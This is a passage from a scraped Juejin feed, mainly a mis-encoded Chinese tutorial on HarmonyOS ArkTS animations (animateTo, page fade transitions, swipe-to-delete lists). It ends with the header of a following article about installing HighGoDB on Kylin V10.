              <span class="hljs-variable language_">this</span>.<span class="hljs-property">scale</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">scale</span> === <span class="hljs-number">1</span> ? <span class="hljs-number">1.2</span> : <span class="hljs-number">1</span>;
            });
          })

        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'æ°´å¹³ä½ç§»'</span>)
          .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-title function_">animateTo</span>({ <span class="hljs-attr">duration</span>: <span class="hljs-number">1000</span> }, <span class="hljs-function">() =&gt;</span> {
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">offsetX</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">offsetX</span> === <span class="hljs-number">0</span> ? <span class="hljs-number">100</span> : <span class="hljs-number">0</span>;
            });
          })
      }
    }
  }
}
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h3 data-id="heading-5">2. æ ¸å¿ƒå‚æ•°è¯´æ˜</h3>
<ul>
<li><code>duration</code>ï¼šåŠ¨ç”»æ—¶é•¿ï¼ˆé»˜è®¤ 300 æ¯«ç§’ï¼‰ï¼Œæ•°å€¼è¶Šå¤§åŠ¨ç”»è¶Šæ…¢ï¼›</li>
<li><code>curve</code>ï¼šåŠ¨ç”»æ›²çº¿ï¼ˆ<code>Curve.Linear</code>åŒ€é€Ÿã€<code>Curve.EaseIn</code>ç¼“å…¥ã€<code>Curve.EaseOut</code>ç¼“å‡ºã€<code>Curve.EaseInOut</code>ç¼“è¿›ç¼“å‡ºï¼‰ï¼›</li>
<li><code>delay</code>ï¼šå»¶è¿Ÿæ‰§è¡Œæ—¶é—´ï¼ˆé»˜è®¤ 0 æ¯«ç§’ï¼‰ï¼Œå¯å®ç°åŠ¨ç”»æ’é˜Ÿæ•ˆæœï¼›</li>
<li>å›è°ƒå‡½æ•°ï¼šåŒ…è£¹éœ€è¦åŠ¨ç”»çš„å±æ€§ä¿®æ”¹é€»è¾‘ï¼Œå±æ€§å˜åŒ–ä¼šè‡ªåŠ¨ç”Ÿæˆè¿‡æ¸¡åŠ¨ç”»ã€‚</li>
</ul>
<h2 data-id="heading-6">ä¸‰ã€è½¬åœºåŠ¨ç”»ï¼štransition ç»„ä»¶ç”¨æ³•</h2>
<p>è½¬åœºåŠ¨ç”»ç”¨äºç»„ä»¶æ˜¾ç¤º / éšè—ã€é¡µé¢åˆ‡æ¢æ—¶çš„è¿‡æ¸¡æ•ˆæœï¼Œé¸¿è’™ 5.0 + æ”¯æŒé€šè¿‡<code>transition</code>ç›´æ¥é…ç½®ï¼Œæ— éœ€å¤æ‚é€»è¾‘ï¼š</p>
<h3 data-id="heading-7">1. é¡µé¢åˆ‡æ¢æ¸å˜æ•ˆæœ</h3>
<p>åœ¨<code>main_pages.json</code>æ³¨å†Œçš„é¡µé¢ä¸­ï¼Œé€šè¿‡<code>pageTransition</code>é…ç½®å…¨å±€é¡µé¢è½¬åœºï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// pages/FirstPage.etsï¼ˆé¦–é¡µï¼‰</span>
<span class="hljs-keyword">@Entry</span>
<span class="hljs-keyword">@Component</span>
struct FirstPage {
  <span class="hljs-built_in">build</span>() {
    <span class="hljs-built_in">Column</span>({ space: <span class="hljs-number">30</span> })
      <span class="hljs-selector-class">.width</span>('<span class="hljs-number">100%</span>')
      <span class="hljs-selector-class">.height</span>('<span class="hljs-number">100%</span>')
      <span class="hljs-selector-class">.padding</span>(<span class="hljs-number">30</span>)
      <span class="hljs-selector-class">.backgroundColor</span>('#f5f5f5') {
      
      Text('é¦–é¡µ')
        <span class="hljs-selector-class">.fontSize</span>(<span class="hljs-number">32</span>)
        <span class="hljs-selector-class">.fontWeight</span>(FontWeight.Bold)

      <span class="hljs-selector-tag">Button</span>('è·³è½¬åˆ°ç¬¬äºŒé¡µ')
        <span class="hljs-selector-class">.type</span>(ButtonType.Capsule)
        <span class="hljs-selector-class">.width</span>(<span class="hljs-number">200</span>)
        <span class="hljs-selector-class">.height</span>(<span class="hljs-number">50</span>)
        <span class="hljs-selector-class">.backgroundColor</span>('#<span class="hljs-number">2</span>f54eb')
        <span class="hljs-selector-class">.onClick</span>(() =&gt; {
          router<span class="hljs-selector-class">.pushUrl</span>({ url: 'pages/SecondPage' });
        })
    }
  }

  <span class="hljs-comment">// é¡µé¢è½¬åœºé…ç½®ï¼ˆæ¸å˜æ•ˆæœï¼‰</span>
  <span class="hljs-built_in">pageTransition</span>() {
    <span class="hljs-built_in">PageTransition</span>()
      <span class="hljs-selector-class">.enter</span>('fade', { duration: <span class="hljs-number">800</span>, curve: Curve.EaseInOut }) <span class="hljs-comment">// è¿›å…¥æ¸å˜</span>
      <span class="hljs-selector-class">.exit</span>('fade', { duration: <span class="hljs-number">800</span>, curve: Curve.EaseInOut }) <span class="hljs-comment">// é€€å‡ºæ¸å˜</span>
  }
}

<span class="hljs-comment">// pages/SecondPage.etsï¼ˆç¬¬äºŒé¡µï¼‰</span>
<span class="hljs-keyword">@Entry</span>
<span class="hljs-keyword">@Component</span>
struct SecondPage {
  <span class="hljs-built_in">build</span>() {
    <span class="hljs-built_in">Column</span>({ space: <span class="hljs-number">30</span> })
      <span class="hljs-selector-class">.width</span>('<span class="hljs-number">100%</span>')
      <span class="hljs-selector-class">.height</span>('<span class="hljs-number">100%</span>')
      <span class="hljs-selector-class">.padding</span>(<span class="hljs-number">30</span>)
      <span class="hljs-selector-class">.backgroundColor</span>('#f5f5f5') {
      
      Text('ç¬¬äºŒé¡µ')
        <span class="hljs-selector-class">.fontSize</span>(<span class="hljs-number">32</span>)
        <span class="hljs-selector-class">.fontWeight</span>(FontWeight.Bold)

      <span class="hljs-selector-tag">Button</span>('è¿”å›é¦–é¡µ')
        <span class="hljs-selector-class">.type</span>(ButtonType.Capsule)
        <span class="hljs-selector-class">.width</span>(<span class="hljs-number">200</span>)
        <span class="hljs-selector-class">.height</span>(<span class="hljs-number">50</span>)
        <span class="hljs-selector-class">.backgroundColor</span>('#ff4d4f')
        <span class="hljs-selector-class">.onClick</span>(() =&gt; {
          router<span class="hljs-selector-class">.backUrl</span>();
        })
    }
  }

  <span class="hljs-comment">// å¤ç”¨æ¸å˜è½¬åœºé…ç½®</span>
  <span class="hljs-built_in">pageTransition</span>() {
    <span class="hljs-built_in">PageTransition</span>()
      <span class="hljs-selector-class">.enter</span>('fade', { duration: <span class="hljs-number">800</span>, curve: Curve.EaseInOut })
      <span class="hljs-selector-class">.exit</span>('fade', { duration: <span class="hljs-number">800</span>, curve: Curve.EaseInOut })
  }
}
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h3 data-id="heading-8">2. ç»„ä»¶è½¬åœºï¼ˆåˆ—è¡¨é¡¹æ»‘åŠ¨åˆ é™¤å‰ç½®ï¼‰</h3>
<p>ç»„ä»¶æ˜¾ç¤º / éšè—æ—¶çš„è½¬åœºæ•ˆæœï¼Œå¯ç»“åˆ<code>if</code>æˆ–<code>visibility</code>æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// ç»„ä»¶è½¬åœºç¤ºä¾‹ï¼ˆæ¸å˜+ä½ç§»ï¼‰</span>
<span class="hljs-selector-tag">Text</span>(<span class="hljs-string">'å¯éšè—ç»„ä»¶'</span>)
  <span class="hljs-selector-class">.transition</span>([
    TransitionEffect.<span class="hljs-built_in">fade</span>({ <span class="hljs-attribute">duration</span>: <span class="hljs-number">500</span> }), <span class="hljs-comment">// æ¸å˜</span>
    TransitionEffect.<span class="hljs-built_in">slide</span>({ <span class="hljs-attribute">direction</span>: SlideDirection.Bottom, <span class="hljs-attribute">duration</span>: <span class="hljs-number">500</span> }) <span class="hljs-comment">// åº•éƒ¨æ»‘å…¥æ»‘å‡º</span>
  ])
  <span class="hljs-selector-class">.visibility</span>(this.isShow ? Visibility.<span class="hljs-attribute">Visible </span>: Visibility.Hidden)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-9">å››ã€å®æˆ˜æ•´åˆï¼šåˆ—è¡¨é¡¹æ»‘åŠ¨åˆ é™¤ + é¡µé¢æ¸å˜</h2>
<h3 data-id="heading-10">1. åˆ—è¡¨é¡¹æ»‘åŠ¨åˆ é™¤ï¼ˆå±æ€§åŠ¨ç”»æ ¸å¿ƒåº”ç”¨ï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { animateTo, <span class="hljs-title class_">Curve</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.ui.animation'</span>;
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.router'</span>;

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">SlideDeleteList</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">taskList</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'å­¦ä¹ å±æ€§åŠ¨ç”»'</span>, <span class="hljs-string">'å®ç°è½¬åœºæ•ˆæœ'</span>, <span class="hljs-string">'å¼€å‘æ»‘åŠ¨åˆ é™¤'</span>, <span class="hljs-string">'æ•´åˆé¡µé¢æ¸å˜'</span>];
  <span class="hljs-meta">@State</span> <span class="hljs-attr">deleteOffsetX</span>: <span class="hljs-built_in">number</span>[] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">taskList</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-number">0</span>); <span class="hljs-comment">// æ¯ä¸ªåˆ—è¡¨é¡¹çš„ä½ç§»</span>

  <span class="hljs-comment">// æ»‘åŠ¨åˆ é™¤åŠ¨ç”»</span>
  <span class="hljs-title function_">handleSwipe</span>(<span class="hljs-params">index: <span class="hljs-built_in">number</span>, offsetX: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-comment">// é™åˆ¶æ»‘åŠ¨èŒƒå›´ï¼ˆ-200åˆ°0ï¼Œ200ä¸ºåˆ é™¤æŒ‰é’®å®½åº¦ï¼‰</span>
    <span class="hljs-keyword">if</span> (offsetX &lt; -<span class="hljs-number">200</span>) offsetX = -<span class="hljs-number">200</span>;
    <span class="hljs-keyword">if</span> (offsetX &gt; <span class="hljs-number">0</span>) offsetX = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] = offsetX;
  }

  <span class="hljs-comment">// åˆ é™¤åˆ—è¡¨é¡¹ï¼ˆå¸¦åŠ¨ç”»ï¼‰</span>
  <span class="hljs-title function_">deleteItem</span>(<span class="hljs-params">index: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-title function_">animateTo</span>({
      <span class="hljs-attr">duration</span>: <span class="hljs-number">500</span>,
      <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseOut</span>
    }, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] = -<span class="hljs-variable language_">this</span>.<span class="hljs-property">taskList</span>.<span class="hljs-property">length</span> * <span class="hljs-number">200</span>; <span class="hljs-comment">// å¿«é€Ÿæ»‘å‡ºå±å¹•</span>
    }, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">taskList</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>); <span class="hljs-comment">// ç§»é™¤å¯¹åº”ä½ç§»çŠ¶æ€</span>
    });
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">15</span> })
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">padding</span>(<span class="hljs-number">30</span>)
      .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-params"><span class="hljs-string">'#f5f5f5'</span></span>) {
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'æ»‘åŠ¨åˆ é™¤åˆ—è¡¨'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">28</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        .<span class="hljs-title function_">marginBottom</span>(<span class="hljs-number">20</span>)

      <span class="hljs-title class_">List</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">10</span> }) {
        <span class="hljs-title class_">ForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">taskList</span>, <span class="hljs-function">(<span class="hljs-params">task, index</span>) =&gt;</span> {
          <span class="hljs-title class_">ListItem</span>() {
            <span class="hljs-title class_">Stack</span>() {
              <span class="hljs-comment">// åˆ é™¤æŒ‰é’®ï¼ˆé»˜è®¤éšè—åœ¨å³ä¾§ï¼‰</span>
              <span class="hljs-title class_">Button</span>(<span class="hljs-string">'åˆ é™¤'</span>)
                .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
                .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
                .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#ff4d4f'</span>)
                .<span class="hljs-title function_">alignContent</span>(<span class="hljs-title class_">FlexAlign</span>.<span class="hljs-property">Center</span>)
                .<span class="hljs-title function_">position</span>({ <span class="hljs-attr">x</span>: <span class="hljs-string">'100%'</span>, <span class="hljs-attr">left</span>: -<span class="hljs-number">200</span> })

              <span class="hljs-comment">// åˆ—è¡¨é¡¹å†…å®¹ï¼ˆå¯æ»‘åŠ¨ï¼‰</span>
              <span class="hljs-title class_">Text</span>(task)
                .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
                .<span class="hljs-title function_">height</span>(<span class="hljs-number">80</span>)
                .<span class="hljs-title function_">lineHeight</span>(<span class="hljs-number">80</span>)
                .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
                .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#ffffff'</span>)
                .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">12</span>)
                .<span class="hljs-title function_">translate</span>({ <span class="hljs-attr">x</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] })
                .<span class="hljs-title function_">onTouch</span>(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
                  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">type</span> === <span class="hljs-title class_">TouchType</span>.<span class="hljs-property">MOVE</span>) {
                    <span class="hljs-comment">// ç›‘å¬æ»‘åŠ¨äº‹ä»¶ï¼Œæ›´æ–°ä½ç§»</span>
                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleSwipe</span>(index, e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">x</span> - e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">startX</span>);
                  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.<span class="hljs-property">type</span> === <span class="hljs-title class_">TouchType</span>.<span class="hljs-property">END</span>) {
                    <span class="hljs-comment">// æ»‘åŠ¨è·ç¦»ä¸è¶³100ï¼Œå›å¼¹</span>
                    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] &gt; -<span class="hljs-number">100</span>) {
                      <span class="hljs-title function_">animateTo</span>({ <span class="hljs-attr">duration</span>: <span class="hljs-number">300</span> }, <span class="hljs-function">() =&gt;</span> {
                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] = <span class="hljs-number">0</span>;
                      });
                    }
                  }
                })
            }
          }
        })
      }

      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'è·³è½¬åˆ°è¯¦æƒ…é¡µï¼ˆæ¸å˜æ•ˆæœï¼‰'</span>)
        .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">250</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#2f54eb'</span>)
        .<span class="hljs-title function_">marginTop</span>(<span class="hljs-number">30</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          router.<span class="hljs-title function_">pushUrl</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'pages/DetailPage'</span> });
        })
    }
  }
}

<span class="hljs-comment">// è¯¦æƒ…é¡µï¼ˆå¤ç”¨é¡µé¢æ¸å˜è½¬åœºï¼‰</span>
<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">DetailPage</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>()
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#f5f5f5'</span>)
      .<span class="hljs-title function_">justifyContent</span>(<span class="hljs-params">FlexAlign.Center</span>) {
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'è¯¦æƒ…é¡µ'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">32</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)

      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'è¿”å›åˆ—è¡¨é¡µ'</span>)
        .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#ff4d4f'</span>)
        .<span class="hljs-title function_">marginTop</span>(<span class="hljs-number">30</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          router.<span class="hljs-title function_">backUrl</span>();
        })
    }
  }

  <span class="hljs-title function_">pageTransition</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">PageTransition</span>()
      .<span class="hljs-title function_">enter</span>(<span class="hljs-string">'fade'</span>, { <span class="hljs-attr">duration</span>: <span class="hljs-number">800</span>, <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span> })
      .<span class="hljs-title function_">exit</span>(<span class="hljs-string">'fade'</span>, { <span class="hljs-attr">duration</span>: <span class="hljs-number">800</span>, <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span> })
  }
}
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h3 data-id="heading-11">2. æ ¸å¿ƒæ•ˆæœè¯´æ˜</h3>
<ul>
<li>åˆ—è¡¨é¡¹æ»‘åŠ¨ï¼šé€šè¿‡<code>onTouch</code>ç›‘å¬æ»‘åŠ¨äº‹ä»¶ï¼Œ<code>animateTo</code>æ§åˆ¶<code>translate</code>ä½ç§»ï¼Œå®ç°æ»‘åŠ¨éœ²å‡ºåˆ é™¤æŒ‰é’®ï¼›</li>
<li>åˆ é™¤åŠ¨ç”»ï¼šç‚¹å‡»åˆ é™¤åï¼Œåˆ—è¡¨é¡¹å¿«é€Ÿæ»‘å‡ºå±å¹•ï¼ŒåŠ¨ç”»ç»“æŸåç§»é™¤æ•°æ®ï¼›</li>
<li>é¡µé¢æ¸å˜ï¼šé€šè¿‡<code>pageTransition</code>é…ç½®<code>fade</code>æ•ˆæœï¼Œè·³è½¬å’Œè¿”å›æ—¶å‡æœ‰å¹³æ»‘æ¸å˜è¿‡æ¸¡ã€‚</li>
</ul>
<h2 data-id="heading-12">äº”ã€å®æˆ˜è¸©å‘æŒ‡å—</h2>
<h3 data-id="heading-13">1. åŠ¨ç”»ä¸ç”Ÿæ•ˆ</h3>
<ul>
<li>ç¡®ä¿å±æ€§æ˜¯ã€Œå“åº”å¼çŠ¶æ€ã€ï¼šå¿…é¡»ç”¨<code>@State</code>/<code>@Link</code>ç­‰è£…é¥°å™¨ï¼Œæ™®é€šå˜é‡ä¿®æ”¹æ— æ³•è§¦å‘åŠ¨ç”»ï¼›</li>
<li>åŠ¨ç”»å‡½æ•°åŒ…è£¹æ­£ç¡®ï¼š<code>animateTo</code>çš„å›è°ƒå‡½æ•°å†…å¿…é¡»ç›´æ¥ä¿®æ”¹å±æ€§ï¼Œä¸å¯åµŒå¥—å¼‚æ­¥æ“ä½œï¼›</li>
<li>ç‰ˆæœ¬é€‚é…ï¼šHarmonyOS 5.0 + æ”¯æŒ<code>PageTransition</code>çš„<code>fade</code>/<code>slide</code>ç®€åŒ–é…ç½®ï¼Œä½ç‰ˆæœ¬éœ€æ‰‹åŠ¨é…ç½®<code>TransitionEffect</code>ã€‚</li>
</ul>
<h3 data-id="heading-14">2. æ»‘åŠ¨åˆ é™¤æ•ˆæœå¼‚å¸¸</h3>
<ul>
<li>é™åˆ¶æ»‘åŠ¨èŒƒå›´ï¼šé¿å…æ»‘åŠ¨è¿‡åº¦å¯¼è‡´ UI é”™ä¹±ï¼Œå»ºè®®é™åˆ¶åœ¨åˆ é™¤æŒ‰é’®å®½åº¦èŒƒå›´å†…ï¼›</li>
<li>çŠ¶æ€åŒæ­¥ï¼š<code>deleteOffsetX</code>æ•°ç»„éœ€ä¸åˆ—è¡¨æ•°æ®ä¸€ä¸€å¯¹åº”ï¼Œåˆ é™¤æ•°æ®æ—¶åŒæ­¥ç§»é™¤å¯¹åº”ä½ç§»çŠ¶æ€ã€‚</li>
</ul>
<h3 data-id="heading-15">3. è½¬åœºæ•ˆæœå¡é¡¿</h3>
<ul>
<li>å‡å°‘åŠ¨ç”»å…ƒç´ ï¼šé¿å…åŒæ—¶å¯¹å¤šä¸ªå¤æ‚ç»„ä»¶æ·»åŠ åŠ¨ç”»ï¼›</li>
<li>ç®€åŒ–åŠ¨ç”»é€»è¾‘ï¼šä¼˜å…ˆä½¿ç”¨ç³»ç»Ÿæä¾›çš„<code>fade</code>/<code>slide</code>ç­‰åŸºç¡€æ•ˆæœï¼Œè‡ªå®šä¹‰åŠ¨ç”»é¿å…å¤æ‚è®¡ç®—ã€‚</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2F46b54a56c7e54e74973e0af43c077bff%3Ftype%3D1%3Fha_source%3Dhmosclass%26ha_sourceId%3D89000248" title="https://developer.huawei.com/consumer/cn/training/classDetail/46b54a56c7e54e74973e0af43c077bff?type=1?ha_source=hmosclass&amp;ha_sourceId=89000248" target="_blank" ref="nofollow noopener noreferrer">åŠ å…¥ç­çº§ï¼Œå­¦ä¹ é¸¿è’™å¼€å‘</a></p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é“¶æ²³éº’éºŸ V10 å®‰è£…éƒ¨ç½²ç€šé«˜æ•°æ®åº“ HighGoDB 4.5 å…¨æµç¨‹ï¼ˆç»Ÿä¿¡UOS Server 20åŒç†ï¼‰]]></title>    <link>https://juejin.cn/post/7583984122235781162</link>    <guid>https://juejin.cn/post/7583984122235781162</guid>    <pubDate>2025-12-16T03:51:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583984122235781162" data-draft-id="7583984122235732010" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é“¶æ²³éº’éºŸ V10 å®‰è£…éƒ¨ç½²ç€šé«˜æ•°æ®åº“ HighGoDB 4.5 å…¨æµç¨‹ï¼ˆç»Ÿä¿¡UOS Server 20åŒç†ï¼‰"/> <meta itemprop="keywords" content="æ•°æ®åº“"/> <meta itemprop="datePublished" content="2025-12-16T03:51:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è·¯é¥_13"/> <meta itemprop="url" content="https://juejin.cn/user/2863549167699853"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é“¶æ²³éº’éºŸ V10 å®‰è£…éƒ¨ç½²ç€šé«˜æ•°æ®åº“ HighGoDB 4.5 å…¨æµç¨‹ï¼ˆç»Ÿä¿¡UOS Server 20åŒç†ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2863549167699853/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è·¯é¥_13
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:51:14.000Z" title="Tue Dec 16 2025 03:51:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body 